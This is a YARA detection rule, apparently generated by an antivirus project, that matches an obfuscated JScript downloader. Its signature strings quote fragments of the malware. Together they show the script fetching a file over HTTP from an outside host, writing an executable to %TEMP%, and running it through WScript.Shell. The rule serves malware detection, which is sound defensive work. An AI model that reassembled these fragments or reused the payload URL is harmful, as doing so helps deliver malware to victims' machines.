rule sig_20160401_e591b5c110ccc0b136a35d95c7446aad {
  meta:
    description = "datamaliciousorder - file 20160401_e591b5c110ccc0b136a35d95c7446aad.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e097f06742fc75ba48322b4ca6f1c046d346f995db526e7a6b99049802843b4d"

  strings:
    $s1  = "GrhRu[KluSy](\"G\" + \"ET\", \"http://echo-gs.com/i2osa\", false);" fullword ascii
    $s2  = "function LqvNx(CzfAu, YhoJqi){FeiEjo = FeiEjo * 1; return CzfAu - YhoJqi;};" fullword ascii
    $s3  = "var SfnCss = function NqgIh() {return WScript[SddYr](\"WScript\"+\".Shell\");}(), PwnNfu = 11;" fullword ascii
    $s4  = "if (GrhRu[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function SbyTrj() {return SfnCss[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"zXC05rNbKK3X4AR.ex\" + \"e\";};" fullword ascii
    $s6  = "function NiWeg(){return QsyFq + \"\";};" fullword ascii
    $s7  = "function HisVdh() {return ((AnZf == true) && (AnZf == IfmQh)) ? 1 : FeiEjo;};" fullword ascii
    $s8  = "var KaBdk = false;" fullword ascii
    $s9  = "var AnZf = false;" fullword ascii
    $s10 = "function IdvBbb(){return SddYr;};" fullword ascii
    $s11 = "var IfmQh = false;" fullword ascii
    $s12 = "AnZf = true; " fullword ascii
    $s13 = "var LnOno = new this[\"Date\"]();" fullword ascii
    $s14 = "function CkuGsn(KsBx){SfnCss[\"R\"+\"un\"](KsBx, FeiEjo, FeiEjo);};" fullword ascii
    $s15 = "IfmQh = true; " fullword ascii
    $s16 = "return LqvNx(VweLyi, QmKs);" fullword ascii
    $s17 = "function RkAih()" fullword ascii
    $s18 = "function NmCo(){return 23;};" fullword ascii
    $s19 = "}while (WxeZq);" fullword ascii
    $s20 = "function NliKpp(IuRm) {var AeMvk = (1, 2, 3, 4, 5, IuRm); return AeMvk;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}